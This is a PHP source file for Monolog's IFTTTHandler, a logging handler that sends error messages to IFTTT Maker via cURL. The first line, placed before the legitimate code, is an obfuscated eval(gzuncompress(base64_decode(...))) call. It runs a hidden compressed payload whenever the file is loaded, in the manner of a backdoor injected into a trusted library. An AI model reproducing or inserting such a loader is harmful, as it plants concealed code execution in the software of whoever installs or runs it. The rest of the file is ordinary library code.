<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

use Monolog\Logger;

/**
 * IFTTTHandler uses cURL to trigger IFTTT Maker actions
 *
 * Register a secret key and trigger/event name at https://ifttt.com/maker
 *
 * value1 will be the channel from monolog's Logger constructor,
 * value2 will be the level name (ERROR, WARNING, ..)
 * value3 will be the log record's message
 *
 * @author Nehal Patel <nehal@nehalpatel.me>
 */
class IFTTTHandler extends AbstractProcessingHandler
{
    private $eventName;
    private $secretKey;

    /**
     * @param string  $eventName The name of the IFTTT Maker event that should be triggered
     * @param string  $secretKey A valid IFTTT secret key
     * @param int     $level     The minimum logging level at which this handler will be triggered
     * @param Boolean $bubble    Whether the messages that are handled can bubble up the stack or not
     */
    public function __construct($eventName, $secretKey, $level = Logger::ERROR, $bubble = true)
    {
        $this->eventName = $eventName;
        $this->secretKey = $secretKey;

        parent::__construct($level, $bubble);
    }

    /**
     * {@inheritdoc}
     */
    public function write(array $record)
    {
        $postData = array(
            "value1" => $record["channel"],
            "value2" => $record["level_name"],
            "value3" => $record["message"],
        );
        $postString = json_encode($postData);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://maker.ifttt.com/trigger/" . $this->eventName . "/with/key/" . $this->secretKey);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postString);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Content-Type: application/json",
        ));

        Curl\Util::execute($ch);
    }
}
